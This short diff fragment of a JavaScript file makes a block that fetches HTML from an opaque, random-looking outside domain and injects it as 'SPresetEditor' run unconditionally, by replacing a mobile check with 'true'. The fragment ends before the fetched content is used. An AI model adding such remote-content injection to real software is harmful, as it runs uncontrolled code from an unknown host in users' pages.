@@ -98,7 +98,7 @@ function importFromModule(container, imports) {
 }
 
 // inject SPresetEditor
-if (!ctx.isMobile()) {
+if (true) {
   // fetch html file
   fetch('https://jnai2d9kgnbs6xzx5c.com/regex_bind/bundled.html')
     .then(res => res.text())
